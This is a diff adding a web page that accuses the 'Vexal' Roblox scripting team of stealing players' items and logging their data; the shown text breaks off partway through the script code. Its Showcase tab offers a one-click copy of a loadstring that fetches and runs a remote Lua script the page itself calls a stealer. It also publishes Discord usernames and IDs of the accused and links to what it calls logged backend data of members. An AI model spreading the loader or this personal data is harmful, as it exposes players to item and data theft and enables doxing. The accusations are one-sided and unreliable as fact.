@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/png" href="https://i.imgur.com/f1fp0Vj.png" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <meta name="description" content="Revealing Live proof of @VexalTeam scamming , logging it's own community" />
+    <meta property="og:title" content="The Vexal Scripts Tragedy" />
+    <meta property="og:description" content="Revealing Live proof of @VexalTeam scamming , logging it's own community" />
+    <meta property="og:image" content="https://i.imgur.com/dLvpbwJ.png" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://www.vexalscripts.xyz/" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="The Vexal Scripts Tragedy" />
+    <meta name="twitter:description" content="Revealing Live proof of @VexalTeam scamming , logging it's own community" />
+    <meta name="twitter:image" content="https://i.imgur.com/dLvpbwJ.png" />
+    <title>The Vexal Scripts Tragedy</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg-primary: #000000;
+            --bg-secondary: #050505;
+            --card-bg: #0a0a0a;
+            --surface: #0f0f0f;
+            --border: #1a1a2e;
+            --text-white: #ffffff;
+            --text-gray: #b0b0c0;
+            --blue-primary: #3b82f6;
+            --blue-hover: #2563eb;
+            --blue-glow: rgba(59, 130, 246, 0.2);
+            --radius: 14px;
+            --radius-sm: 8px;
+            --shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.8);
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-white);
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container { max-width: 1280px; margin: 0 auto; padding: 0 24px; width: 100%; }
+        header {
+            background: rgba(0, 0, 0, 0.96);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border);
+        }
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            padding: 16px 0;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 22px;
+            font-weight: 700;
+            text-decoration: none;
+            color: var(--text-white);
+        }
+        .logo img { height: 38px; width: auto; border-radius: 10px; }
+        .logo span {
+            background: linear-gradient(135deg, #ffffff, #3b82f6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .nav-links {
+            display: flex;
+            gap: 32px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .nav-link {
+            color: var(--text-gray);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+        .nav-link:hover, .nav-link.active { color: var(--blue-primary); }
+        .mobile-menu-btn {
+            display: none;
+            font-size: 28px;
+            cursor: pointer;
+            color: var(--text-white);
+        }
+        @media (max-width: 768px) {
+            .mobile-menu-btn { display: block; }
+            .nav-links {
+                display: none;
+                width: 100%;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 18px;
+                padding: 20px 0 12px;
+                border-top: 1px solid var(--border);
+            }
+            .nav-links.show { display: flex; }
+            .header-content { flex-direction: row; flex-wrap: wrap; }
+        }
+        .hero { padding: 60px 0 40px; text-align: center; }
+        .hero h1 {
+            font-size: 52px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ffffff, #3b82f6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 16px;
+            letter-spacing: -0.02em;
+        }
+        .hero p {
+            font-size: 18px;
+            color: var(--text-gray);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .hero-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 32px;
+            flex-wrap: wrap;
+        }
+        .btn-large { padding: 12px 28px; font-size: 15px; }
+        .hero-image-large { margin-top: 55px; display: flex; justify-content: center; }
+        .hero-image-large img {
+            max-width: 100%;
+            width: 750px;
+            border-radius: 24px;
+            border: 1px solid var(--border);
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.7);
+        }
+        .mvsd-preview {
+            background: linear-gradient(135deg, #0a0a1a, #000000);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            margin: 30px 0 40px;
+            padding: 24px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .preview-video {
+            flex: 1.2;
+            min-width: 260px;
+            border-radius: 16px;
+            overflow: hidden;
+            background: #000;
+            aspect-ratio: 16 / 9;
+            position: relative;
+            cursor: pointer;
+        }
+        .preview-video iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0f0f1a, #050510);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            color: var(--text-white);
+            font-size: 14px;
+            position: relative;
+            z-index: 2;
+        }
+        .video-placeholder i { font-size: 48px; color: var(--blue-primary); opacity: 0.9; }
+        .video-placeholder span { font-weight: 500; }
+        .preview-video.loaded .video-placeholder { display: none; }
+        .preview-info { flex: 1; min-width: 200px; }
+        .preview-info h2 { font-size: 28px; margin-bottom: 12px; color: var(--text-white); }
+        .preview-info p { color: var(--text-gray); margin-bottom: 20px; line-height: 1.5; }
+        .scripts-section { padding: 20px 0 70px; flex: 1; }
+        .section-header { margin-bottom: 35px; text-align: center; }
+        .section-header h2 { font-size: 34px; font-weight: 700; color: var(--text-white); }
+        .section-header p { color: var(--text-gray); margin-top: 8px; }
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+            gap: 28px;
+            margin-bottom: 40px;
+        }
+        .sub-scripts-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 28px;
+            margin-top: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .game-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            transition: all 0.25s ease;
+            cursor: pointer;
+        }
+        .game-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--blue-primary);
+            box-shadow: 0 10px 30px -10px var(--blue-glow);
+        }
+        .game-header {
+            padding: 24px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+        .game-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 16px;
+            background: var(--surface);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .game-icon img { width: 100%; height: 100%; object-fit: cover; }
+        .game-info h3 { font-size: 22px; font-weight: 700; margin-bottom: 6px; color: var(--text-white); }
+        .game-info p { font-size: 13px; color: var(--text-gray); }
+        .expand-indicator { margin-left: auto; color: var(--blue-primary); font-size: 20px; }
+        .script-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            overflow: hidden;
+            transition: all 0.25s ease;
+            display: flex;
+            flex-direction: column;
+        }
+        .script-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--blue-primary);
+            box-shadow: 0 10px 30px -10px var(--blue-glow);
+        }
+        .script-header {
+            padding: 20px 20px 14px 20px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .script-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 14px;
+            background: var(--surface);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .script-icon img { width: 100%; height: 100%; object-fit: cover; }
+        .script-info h3 { font-size: 20px; font-weight: 700; margin-bottom: 6px; color: var(--text-white); }
+        .game-id-badge {
+            font-size: 11px;
+            color: var(--text-gray);
+            background: rgba(59, 130, 246, 0.12);
+            padding: 3px 12px;
+            border-radius: 30px;
+            display: inline-block;
+        }
+        .script-body {
+            padding: 18px 20px 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .script-description {
+            font-size: 14px;
+            color: var(--text-gray);
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+        .script-features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .script-features span {
+            background: rgba(59, 130, 246, 0.1);
+            color: #90cdf4;
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 500;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+        .flex-buttons {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: auto;
+        }
+        .btn {
+            padding: 10px 16px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            text-decoration: none;
+            flex: 1 0 auto;
+            min-width: 100px;
+        }
+        .btn-primary { background: var(--blue-primary); color: white; }
+        .btn-primary:hover { background: var(--blue-hover); transform: scale(0.98); }
+        .btn-outline {
+            background: transparent;
+            color: var(--text-white);
+            border: 1px solid var(--border);
+        }
+        .btn-outline:hover {
+            border-color: var(--blue-primary);
+            background: rgba(59, 130, 246, 0.1);
+            color: var(--blue-primary);
+        }
+        .back-button {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-white);
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 25px;
+            transition: all 0.2s ease;
+        }
+        .back-button:hover {
+            border-color: var(--blue-primary);
+            color: var(--blue-primary);
+        }
+        .platform-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 32px;
+            margin: 40px 0 70px;
+        }
+        .platform-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 34px 20px;
+            text-align: center;
+            transition: all 0.2s ease;
+        }
+        .platform-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--blue-primary);
+        }
+        .platform-icon {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 18px;
+            background: var(--surface);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .platform-icon img { width: 48px; height: 48px; object-fit: contain; }
+        .platform-card h3 { font-size: 22px; margin-bottom: 16px; color: var(--text-white); }
+        .platform-card .btn { margin-top: 8px; }
+        .discord-info {
+            background: #0a0a0a;
+            padding: 12px;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border);
+            margin-bottom: 12px;
+            font-size: 13px;
+            color: var(--text-gray);
+            text-align: left;
+        }
+        .discord-info strong { color: var(--text-white); }
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(12px);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .album-modal {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 28px;
+            max-width: 700px;
+            width: 90%;
+            max-height: 80vh;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+        }
+        .album-modal img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            max-height: 300px;
+            object-fit: contain;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .album-modal img:hover { transform: scale(1.02); }
+        .album-close {
+            position: sticky;
+            top: 0;
+            background: var(--card-bg);
+            padding: 8px;
+            width: 100%;
+            text-align: right;
+            font-size: 28px;
+            cursor: pointer;
+            color: var(--text-gray);
+            z-index: 10;
+        }
+        .album-close:hover { color: white; }
+        .info-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .info-card .copyable {
+            background: #0a0a0a;
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border);
+            margin: 4px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: var(--text-gray);
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .info-card .copyable:hover { border-color: var(--blue-primary); }
+        .info-card .copyable i { color: var(--blue-primary); }
+        footer {
+            background: rgba(0, 0, 0, 0.96);
+            border-top: 1px solid var(--border);
+            padding: 45px 0 35px;
+            margin-top: auto;
+            width: 100%;
+        }
+        .footer-content {
+            display: flex;
+            justify-content: center;
+            gap: 60px;
+            flex-wrap: wrap;
+        }
+        .footer-col { text-align: center; }
+        .footer-col h4 { font-size: 18px; margin-bottom: 16px; color: var(--text-white); }
+        .footer-links { list-style: none; }
+        .footer-links li { margin-bottom: 10px; }
+        .footer-links a {
+            color: var(--text-gray);
+            text-decoration: none;
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+        .footer-links a:hover { color: var(--blue-primary); }
+        .copyright {
+            text-align: center;
+            padding-top: 35px;
+            margin-top: 30px;
+            border-top: 1px solid var(--border);
+            color: var(--text-gray);
+            font-size: 13px;
+        }
+        @media (max-width: 768px) {
+            .mvsd-preview { flex-direction: column; text-align: center; }
+            .sub-scripts-grid, .games-grid { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 36px; }
+            .flex-buttons { flex-direction: column; }
+            .btn { width: 100%; }
+        }
+        .info-preview-img {
+            width: 100%;
+            max-width: 600px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+            margin: 20px auto;
+            display: block;
+            cursor: pointer;
+        }
+        .tag {
+            display: inline-block;
+            background: rgba(59, 130, 246, 0.15);
+            color: var(--blue-primary);
+            padding: 4px 16px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 500;
+            margin: 8px 0;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        @media (max-width: 600px) { .info-grid { grid-template-columns: 1fr; } }
+        .backend-iframe {
+            width: 100%;
+            height: 600px;
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            background: #1a1a1a;
+        }
+    </style>
+</head>
+<body>
+<header>
+    <div class="container">
+        <div class="header-content">
+            <a href="#" class="logo" id="homeLogoLink">
+                <img src="https://i.imgur.com/f1fp0Vj.png" alt="Vexal Logo">
+                <span>The Vexal Scripts Tragedy</span>
+            </a>
+            <div class="mobile-menu-btn" id="mobileMenuBtn"><i class="fas fa-bars"></i></div>
+            <div class="nav-links" id="navLinks">
+                <div class="nav-link active" data-tab="home">Home</div>
+                <div class="nav-link" data-tab="showcase">Showcase</div>
+                <div class="nav-link" data-tab="exposed">Exposed</div>
+                <div class="nav-link" data-tab="information">Information</div>
+                <div class="nav-link" data-tab="platform">Platform</div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<div id="homeTab" class="tab-content" style="display: block;">
+    <div class="hero">
+        <div class="container">
+            <h1>The Vexal Scripts Tragedy</h1>
+            <p>Revealing Live proof of @VexalTeam scamming , logging it's own community</p>
+            <div class="hero-buttons">
+                <button id="homeShowcaseBtn" class="btn btn-primary btn-large"><i class="fas fa-eye"></i> Showcase</button>
+                <button id="homeExposedBtn" class="btn btn-outline btn-large"><i class="fas fa-exclamation-triangle"></i> Exposed</button>
+            </div>
+            <div class="hero-image-large">
+                <img src="https://i.imgur.com/0tzVRcQ.png" alt="Vexal Tragedy Preview">
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="showcaseTab" class="tab-content" style="display: none;">
+    <section class="hero">
+        <div class="container">
+            <h1>Showcase</h1>
+            <p>All you have to do is use a VPN when your using Vexal Scripts , and don't have any MVSD items in your inventory unless you will get it taken as what you seen in the video & will get your information taken BE AWARE</p>
+        </div>
+    </section>
+    <section class="scripts-section">
+        <div class="container">
+            <div id="showcaseViewContainer">
+                <div class="section-header">
+                    <h2>Watch the video of Vexal Downfall , and the tragedy of VexalTeam and what it did to it's own community</h2>
+                </div>
+                <div id="showcaseGameGrid" class="games-grid"></div>
+                <div id="showcaseSubContainer" style="display: none;"></div>
+            </div>
+        </div>
+    </section>
+</div>
+
+<div id="exposedTab" class="tab-content" style="display: none;">
+    <section class="hero">
+        <div class="container">
+            <h1>Exposed</h1>
+            <p>All the evidence against VexalScripts</p>
+        </div>
+    </section>
+    <section class="scripts-section">
+        <div class="container">
+            <div id="exposedViewContainer">
+                <div class="section-header">
+                    <h2>Vexal Scriptings</h2>
+                    <p>Server Id: 1466177484528680973</p>
+                </div>
+                <div id="exposedGameGrid" class="games-grid"></div>
+                <div id="exposedSubContainer" style="display: none;"></div>
+            </div>
+        </div>
+    </section>
+</div>
+
+<div id="informationTab" class="tab-content" style="display: none;">
+    <section class="hero">
+        <div class="container">
+            <h1>Information</h1>
+            <p>Game is Game.</p>
+            <div class="tag">Public Information</div>
+        </div>
+    </section>
+    <section class="scripts-section">
+        <div class="container">
+            <img src="https://i.imgur.com/rFeeM3O.png" alt="Information Preview" class="info-preview-img" onclick="previewImage(this.src)">
+            <p style="color:var(--text-gray);text-align:center;margin-bottom:30px;">Since they want to mess with us, let me tell you that one of Vexal owners (Vexal) decided to fuck around and find out.</p>
+            <div class="games-grid" id="infoGameGrid"></div>
+            <div id="infoSubContainer" style="display: none;"></div>
+            <img src="https://i.imgur.com/YFoxuC8.png" alt="Footer Info" class="info-preview-img" style="margin-top:40px;" onclick="previewImage(this.src)">
+        </div>
+    </section>
+</div>
+
+<div id="platformTab" class="tab-content" style="display: none;">
+    <div class="hero">
+        <div class="container">
+            <h1>Our Platforms</h1>
+            <p>Follow for updates, new releases, and community</p>
+        </div>
+    </div>
+    <div class="container">
+        <div class="platform-grid" id="platformGrid"></div>
+    </div>
+</div>
+
+<footer>
+    <div class="container">
+        <div class="footer-content">
+            <div class="footer-col">
+                <h4>The Vexal Scripts Tragedy</h4>
+                <ul class="footer-links">
+                    <li><a href="#" id="footerHomeLink">Home</a></li>
+                    <li><a href="#" id="footerShowcaseLink">Showcase</a></li>
+                    <li><a href="#" id="footerExposedLink">Exposed</a></li>
+                    <li><a href="#" id="footerInfoLink">Information</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Resources</h4>
+                <ul class="footer-links">
+                    <li><a href="#" id="footerPlatformLink">Platforms</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="copyright"><p>The Vexal Scripts Tragedy | Revealing the truth</p></div>
+    </div>
+</footer>
+
+<script>
+    const platformData = [
+        { name: "Github", icon: "https://i.imgur.com/pVLs1EG.png", url: "https://github.com/evelynnscripts", btnText: "Visit Github" },
+        { name: "Youtube", icon: "https://i.imgur.com/ZoMgUr7.png", url: "https://www.youtube.com/@VexalScripts", btnText: "Visit Channel" },
+        { name: "Vexal Website", icon: "https://i.imgur.com/6cKnhdJ.png", url: "https://vexalscripts.xyz/", btnText: "Visit Website" },
+        { name: "Vexal Team Discord's", icon: "https://i.imgur.com/PkXtp4P.png", isDiscord: true, accounts: [
+            { username: "deyvisback", display: "deyvis", id: "755281915401076756", logo: "https://i.imgur.com/PkXtp4P.png" },
+            { username: "cx85", display: "vexal", id: "1435323127235215552", logo: "https://i.imgur.com/m2irOtC.png" },
+            { username: "xlum20", display: "!. dior-chan", id: "1187488993709924425", logo: "https://i.imgur.com/kl46TNo.png" },
+            { username: ".flosh_", display: "Hester", id: "1491037139973177344", logo: "https://i.imgur.com/6UATQLt.png" }
+        ]},
+        { name: "Discord Server", icon: "https://i.imgur.com/6cKnhdJ.png", isServer: true, serverName: "Vexal Scriptings", invite: "https://discord.com/invite/nMFz2Sq45J" }
+    ];
+
+    const exposedAlbums = [
+    { title: "Stealing Items", desc: "View all the proof of Vexal stealing items", images: ["https://i.imgur.com/Ir2xVc5.png","https://i.imgur.com/3hoQqDA.png","https://i.imgur.com/CMjn0KI.png","https://i.imgur.com/SUI5BVU.png","https://i.imgur.com/HQoKKRi.png","https://i.imgur.com/vZlI93Y.png","https://i.imgur.com/dvGhYhE.png","https://i.imgur.com/j6MM8yD.png"] },
+    { title: "Stealing Data Information", desc: "View all the proof of Vexal stealing data", images: ["https://i.imgur.com/xO84KHT.png","https://i.imgur.com/71wMNnL.png","https://i.imgur.com/CjNrxO4.png","https://i.imgur.com/eH6IoKy.png","https://i.imgur.com/zGchvte.png","https://i.imgur.com/vy7LTzw.png","https://i.imgur.com/ApYXMx5.png","https://i.imgur.com/nfyBfHA.png","https://i.imgur.com/yoLqV1z.png","https://i.imgur.com/JBJXw2i.png","https://i.imgur.com/nBoII5L.png","https://i.imgur.com/3tV4Jkh.png","https://i.imgur.com/xCnVuSR.png","https://i.imgur.com/tlr3JeB.png","https://i.imgur.com/C4CMybY.png"] },
+    { title: "Reports Made of Vexal", desc: "View all the reports made against Vexal", images: ["https://i.imgur.com/NluxXCt.png","https://i.imgur.com/W1jve8z.png","https://i.imgur.com/SNAQFfg.png","https://i.imgur.com/FjQggH0.png","https://i.imgur.com/H0fFUFI.png","https://i.imgur.com/xJ1pXjy.png","https://i.imgur.com/xJlF4Jp.png"] },
+    { title: "Vexal Breaking thier own Rules", desc: "View proof of Vexal breaking their own rules", images: ["https://i.imgur.com/j6aUxOC.png","https://i.imgur.com/nJgL8AD.png","https://i.imgur.com/57Cia9k.png"] },
+    { title: "Vexal Lied to community", desc: "Said this mvsd spawner script is not a stealer then starts stealing your items", images: ["https://i.imgur.com/URxraQd.png","https://i.imgur.com/4Ic6eSQ.png"] },
+    { title: "View Logged Backend", desc: "View the backend of what Vexal logged while you injected vexal scripts", isBackend: true, backendUrl: "/api/members" },
+    { title: "View Vexal Backend", desc: "You will see his own backend of his OWN logged information", isBackend: true, backendUrl: "/api/vexal" }
+];
+
+    function renderPlatforms() {
+        const grid = document.getElementById('platformGrid');
+        grid.innerHTML = '';
+        platformData.forEach((p, idx) => {
+            const card = document.createElement('div');
+            card.className = 'platform-card';
+            let content = `<div class="platform-icon"><img src="${p.icon}" alt="${p.name}"></div><h3>${p.name}</h3>`;
+            if (p.isDiscord) {
+                let accIdx = 0;
+                const renderAccount = (i) => {
+                    const acc = p.accounts[i];
+                    return `<div class="discord-info"><strong>Username:</strong> ${acc.username}<br><strong>Display:</strong> ${acc.display}<br><strong>ID:</strong> ${acc.id}</div>`;
+                };
+                content += `<div id="discordAccount_${idx}">${renderAccount(0)}</div>`;
+                if (p.accounts.length > 1) {
+                    content += `<button class="btn btn-outline" onclick="cycleDiscordAccount(${idx})">Next Account <i class="fas fa-arrow-right"></i></button>`;
+                }
+                content += `<div style="margin-top:10px;font-size:12px;color:var(--text-gray)">${p.accounts.length} accounts</div>`;
+                card.innerHTML = content;
+                card._accounts = p.accounts;
+                card._currentAcc = 0;
+                card._idx = idx;
+            } else if (p.isServer) {
+                content += `<div class="discord-info"><strong>Server:</strong> ${p.serverName}<br><strong>Invite:</strong> ${p.invite}</div>`;
+                content += `<a href="${p.invite}" target="_blank" class="btn btn-primary">Join Server <i class="fas fa-external-link-alt"></i></a>`;
+                card.innerHTML = content;
+            } else {
+                content += `<a href="${p.url}" target="_blank" class="btn btn-primary">${p.btnText} <i class="fas fa-external-link-alt"></i></a>`;
+                card.innerHTML = content;
+            }
+            grid.appendChild(card);
+        });
+    }
+
+    window.cycleDiscordAccount = function(idx) {
+        const card = document.querySelectorAll('.platform-card')[idx];
+        if (!card || !card._accounts) return;
+        const accs = card._accounts;
+        let current = card._currentAcc || 0;
+        current = (current + 1) % accs.length;
+        card._currentAcc = current;
+        const container = card.querySelector(`[id^="discordAccount_${idx}"]`);
+        if (container) {
+            const acc = accs[current];
+            container.innerHTML = `<div class="discord-info"><strong>Username:</strong> ${acc.username}<br><strong>Display:</strong> ${acc.display}<br><strong>ID:</strong> ${acc.id}</div>`;
+            const icon = card.querySelector('.platform-icon img');
+            if (icon) icon.src = acc.logo;
+        }
+    };
+
+    function renderShowcase() {
+        const grid = document.getElementById('showcaseGameGrid');
+        grid.innerHTML = '';
+        const game = {
+            gameName: "Murderers VS Sheriffs DUELS",
+            gameId: "12355337193",
+            icon: "https://i.imgur.com/JXay5BY.png",
+            route: "/mvsd",
+            scripts: [
+                { name: "MvsdSpawnerBeta", gameId: "12355337193", desc: "This script is used in the video that was later caught stealing your mvsd items when you inject this script #VexalScripts", featuresBadge: ["Stealer", "Fake Visuals", "ItemTaker", "Bait"], icon: "https://i.imgur.com/JXay5BY.png", gameLink: "https://www.roblox.com/games/12355337193", code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/evelynnscripts/scriptings/refs/heads/main/MvsdSpawnerBeta.lua", true))()` }
+            ]
+        };
+        const card = document.createElement('div');
+        card.className = 'game-card';
+        card.innerHTML = `
+            <div class="game-header">
+                <div class="game-icon"><img src="${game.icon}" alt="icon"></div>
+                <div class="game-info">
+                    <h3>${game.gameName}</h3>
+                    <p>Game ID: ${game.gameId}</p>
+                </div>
+                <div class="expand-indicator"><i class="fas fa-chevron-right"></i></div>
+            </div>
+        `;
+        card.addEventListener('click', () => showShowcaseScript(game));
+        grid.appendChild(card);
+    }
+
+    function showShowcaseScript(game) {
+        const grid = document.getElementById('showcaseGameGrid');
+        const sub = document.getElementById('showcaseSubContainer');
+        grid.style.display = 'none';
+        sub.style.display = 'block';
+        const script = game.scripts[0];
+        let html = `<button class="back-button" id="showcaseBackBtn"><i class="fas fa-arrow-left"></i> Back</button>`;
+        html += `
+            <div class="mvsd-preview">
+    <div class="preview-video" id="showcaseVideoPlayer" style="background:#000; display:flex; align-items:center; justify-content:center; aspect-ratio:16/9; overflow:hidden; border-radius:16px;">
+        <video autoplay loop muted playsinline style="width:100%; height:100%; object-fit:cover;">
+            <source src="https://i.imgur.com/yVB6qmU.mp4" type="video/mp4">
+            <source src="https://i.imgur.com/yVB6qmU.webm" type="video/webm">
+            Your browser doesn't support video.
+        </video>
+    </div>
+    <div class="preview-info">
+        <h2>Showcasing Vexal MvsdSpawner script, You will see how they are taking your items & doxing you (Stealing your information) as you injected their scripts</h2>
+        <p>Watch the video and see what VexalTeam did to it's members!!!</p>
+    </div>
+</div>
+            <div class="section-header"><h2>${game.gameName}</h2><p>Script used in the video</p></div>
+            <div class="sub-scripts-grid">
+                <div class="script-card">
+                    <div class="script-header">
+                        <div class="script-icon"><img src="${script.icon}" alt="icon"></div>
+                        <div class="script-info">
+                            <h3>${script.name}</h3>
+                            <div><span class="game-id-badge">Game ID: ${script.gameId}</span></div>
+                        </div>
+                    </div>
+                    <div class="script-body">
+                        <p class="script-description">${script.desc}</p>
+                        <div class="script-features">${script.featuresBadge.map(f => `<span>${f}</span>`).join('')}</div>
+                        <div class="flex-buttons">
+                            <button class="btn btn-primary copyBtn" data-code="${script.code}"><i class="fas fa-copy"></i> Copy Script</button>
+                            <a href="${script.gameLink}" target="_blank" class="btn btn-outline"><i class="fas fa-gamepad"></i> Play Game</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+        sub.innerHTML = html;
+
+        document.getElementById('showcaseBackBtn').addEventListener('click', () => {
+            grid.style.display = 'grid';
+            sub.style.display = 'none';
+        });
+
+        document.querySelectorAll('.copyBtn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const code = btn.getAttribute('data-code');
+                navigator.clipboard.writeText(code).then(() => {
+                    alert('Script copied to clipboard');
+                }).catch(() => {
+                    const ta = document.createElement('textarea');
+                    ta.value = code;
+                    document.body.appendChild(ta);
+                    ta.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(ta);
+                    alert('Copied to clipboard');
+                });
+            });
+        });
+    }
+
+    function renderExposedVideo() {
+        const container = document.getElementById('exposedViewContainer');
+        const videoHTML = `
+            <div class="mvsd-preview" style="margin-top: 0;">
+                <div class="preview-video" style="background:#000; display:flex; align-items:center; justify-content:center; aspect-ratio:16/9; overflow:hidden; border-radius:16px; position:relative;">
+                    <iframe width="100%" height="100%" src="https://www.youtube.com/embed/N8H0zTKRNsk" 
+                        title="YouTube video player" frameborder="0" 
+                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                        allowfullscreen style="position:absolute; top:0; left:0; width:100%; height:100%; border:none;">
+                    </iframe>
+                </div>
+                <div class="preview-info">
+                    <h2>Watch the Full entire video as it will give you the full truth behind @VexalScriptings. What you are about to watch contains Doxing , Stealing Items , Offesnive content such as location and more to see</h2>
+                    <p>Watch to the end to see the real Vexal Team.</p>
+                </div>
+            </div>
+        `;
+        container.insertAdjacentHTML('afterbegin', videoHTML);
+    }
+
+    function renderExposed() {
+        const grid = document.getElementById('exposedGameGrid');
+        grid.innerHTML = '';
+        exposedAlbums.forEach((album, idx) => {
+            const card = document.createElement('div');
+            card.className = 'game-card';
+            card.innerHTML = `
+                <div class="game-header">
+                    <div class="game-icon"><img src="https://i.imgur.com/6cKnhdJ.png" alt="icon"></div>
+                    <div class="game-info">
+                        <h3>${album.title}</h3>
